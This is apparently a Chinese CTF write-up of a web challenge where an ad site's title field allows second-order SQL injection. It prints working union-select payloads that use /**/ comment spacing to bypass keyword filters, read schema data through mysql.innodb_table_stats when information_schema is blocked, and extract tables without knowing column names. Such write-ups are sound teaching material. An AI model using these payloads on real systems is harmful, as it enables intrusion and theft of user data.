![[Pasted image 20221125153820.png]]

---
首页长这样

![[Pasted image 20221125153836.png]]

---
`POST`的形式

![[Pasted image 20221125154449.png]]

---
尝试使用`admin`注册时提示该用户已被注册

![[Pasted image 20221125155037.png]]

使用用户名`aaa`和密码`123`注册并登录

![[Pasted image 20221125155328.png]]

![[Pasted image 20221125155358.png]]

![[Pasted image 20221125155509.png]]

`POST`内容

![[Pasted image 20221125155832.png]]

![[Pasted image 20221125155519.png]]

广告详情页是`/detail.php?id=xxx`的形式

![[Pasted image 20221125161128.png]]

尝试对`id`进行`sql`注入

无果QAQ

![[Pasted image 20221125161453.png]]

尝试`SSTI`

![[Pasted image 20221125161510.png]]

![[Pasted image 20221125161520.png]]

貌似对标题有效，但大括号还在，估计和`SSTI`无关，更偏向于`+`直接被过滤了，回到`sql`注入试试

当标题为`and`、`or`或`#`时会提示`标题含有敏感词汇`

![[Pasted image 20221125162659.png]]

对于payload `1'`，访问`detail.php`时发现`mysql`报错

![[Pasted image 20221125163216.png]]

确定是`sql`注入

为什么会用广告名进行`sql`查询呢QwQ

猜测后端是直接维护一张广告名和广告`id`的映射表，然后神奇地用广告名来查询广告内容了（下次记得还是用`id`查好，这样就能直接在url上注入了hiahiahia）

用`union select`检查注入点
```sql
1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'
```
麻了22个字段出题人这是要累死人（恼

![[Pasted image 20221125164232.png]]

注入点在2和3

什么，广告名都能注入的嘛，后端你查询咋写的QAQ，用来查询的字符串合着真的只有查询作用呗

---
那就拿广告名来注入叭

查看当前数据库
```sql
1'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'
```
![[Pasted image 20221125164609.png]]

查看所有数据库

这里改成`where '1'='1`来补全后面的引号了
```sql
1'/**/union/**/select/**/1,group_concat(schema_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.schemata/**/where/**/'1'='1
```

![[Pasted image 20221125164918.png]]

大意了，`information`的`or`被ban了QAQ

好的接下来是学习时间（**悲**

---
![[Pasted image 20221125170222.png]]

```sql
1'/**/union/**/select/**/1,group_concat(database_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/'1'='1
```

---
查看表格

![[Pasted image 20221125170634.png]]

```sql
1'/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/'1'='1
```
![[Pasted image 20221125170819.png]]

读取FLAG_TABLE内容

这波不知道字段的查询真的惊到我了，`sql`还能这么玩的嘛
```sql
1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from/**/(select/**/1/**/as/**/a/**/union/**/select/**/*/**/from/**/ctftraining.FLAG_TABLE)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
```
![[Pasted image 20221125173613.png]]

被骗了.jpg

读取`users`内容
```sql
1'/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
```

![[Pasted image 20221125173943.png]]

学到了学到了QwQ

#Web #HTTP #SQL注入 #绕过 #联合注入